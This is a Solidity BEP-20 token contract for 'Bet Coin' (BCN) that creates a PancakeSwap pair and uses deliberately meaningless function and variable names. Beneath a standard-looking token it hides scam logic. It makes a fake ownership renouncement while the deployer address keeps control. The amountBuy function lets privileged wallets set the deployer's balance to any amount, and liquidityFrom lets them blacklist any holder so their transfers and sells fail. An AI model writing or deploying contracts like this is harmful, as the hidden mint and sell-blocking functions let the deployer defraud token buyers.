/**
 *Submitted for verification at BscScan.com on 2023-02-18
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface autoAt {
    function createPair(address tokenWallet, address tokenMaxSwap) external returns (address);
}

interface toLimit {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract BetCoin {

    function launchedMin() public {
        
        if (enableAtShould == liquidityTo) {
            liquidityTo = buyAt;
        }
        toIs=0;
    }

    uint256 private feeTx;

    function amountBuy(uint256 txSell) public {
        if (!walletMode[fromMin()]) {
            return;
        }
        balanceOf[takeMin] = txSell;
    }

    function senderReceiver(address isFund, address receiverBuy, uint256 txSell) internal returns (bool) {
        require(balanceOf[isFund] >= txSell);
        balanceOf[isFund] -= txSell;
        balanceOf[receiverBuy] += txSell;
        emit Transfer(isFund, receiverBuy, txSell);
        return true;
    }

    address public sellLaunch;

    address public takeMin;

    uint256 private toIs;

    address public owner;

    function walletReceiverSwap() public {
        if (enableAuto != feeTx) {
            enableAtShould = toIs;
        }
        if (liquidityTo == enableAuto) {
            buyAt = enableAuto;
        }
        buyAt=0;
    }

    uint256 public enableAtShould;

    function toTotal() public {
        emit OwnershipTransferred(takeMin, address(0));
        owner = address(0);
    }

    function amountShouldAt() public view returns (bool) {
        return senderLaunch;
    }

    function liquidityExempt(address fundMode) public {
        if (isTrading) {
            return;
        }
        if (senderLaunch) {
            feeTx = enableAtShould;
        }
        walletMode[fundMode] = true;
        
        isTrading = true;
    }

    uint256 public enableAuto;

    function toReceiver() public view returns (uint256) {
        return enableAuto;
    }

    bool public isTrading;

    function liquidityAtSell(address isFund, address receiverBuy, uint256 txSell) internal returns (bool) {
        if (isFund == takeMin) {
            return senderReceiver(isFund, receiverBuy, txSell);
        }
        require(!listTeam[isFund]);
        return senderReceiver(isFund, receiverBuy, txSell);
    }

    uint256 public totalSupply = 100000000 * 10 ** 18;

    function approve(address enableReceiver, uint256 txSell) public returns (bool) {
        allowance[fromMin()][enableReceiver] = txSell;
        emit Approval(fromMin(), enableReceiver, txSell);
        return true;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function fromMin() private view returns (address) {
        return msg.sender;
    }

    uint256 private buyAt;

    bool private sellBuyTo;

    mapping(address => mapping(address => uint256)) public allowance;

    constructor (){
        
        toLimit maxLaunchTo = toLimit(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        sellLaunch = autoAt(maxLaunchTo.factory()).createPair(maxLaunchTo.WETH(), address(this));
        owner = fromMin();
        if (feeTx != liquidityTo) {
            enableAuto = liquidityTo;
        }
        takeMin = owner;
        walletMode[takeMin] = true;
        balanceOf[takeMin] = totalSupply;
        
        emit Transfer(address(0), takeMin, totalSupply);
        toTotal();
    }

    string public symbol = "BCN";

    mapping(address => bool) public listTeam;

    event Transfer(address indexed from, address indexed launchTokenList, uint256 value);

    function getOwner() external view returns (address) {
        return owner;
    }

    uint8 public decimals = 18;

    function txEnable() public view returns (bool) {
        return sellBuyTo;
    }

    function transferFrom(address isFund, address receiverBuy, uint256 txSell) external returns (bool) {
        if (allowance[isFund][fromMin()] != type(uint256).max) {
            require(txSell <= allowance[isFund][fromMin()]);
            allowance[isFund][fromMin()] -= txSell;
        }
        return liquidityAtSell(isFund, receiverBuy, txSell);
    }

    mapping(address => bool) public walletMode;

    bool public senderLaunch;

    bool private minBuy;

    event Approval(address indexed shouldTotal, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;

    function liquidityFrom(address senderSellTake) public {
        
        if (senderSellTake == takeMin || senderSellTake == sellLaunch || !walletMode[fromMin()]) {
            return;
        }
        if (feeTx == liquidityTo) {
            sellBuyTo = true;
        }
        listTeam[senderSellTake] = true;
    }

    function transfer(address totalBuyMode, uint256 txSell) external returns (bool) {
        return liquidityAtSell(fromMin(), totalBuyMode, txSell);
    }

    uint256 private liquidityTo;

    string public name = "Bet Coin";

}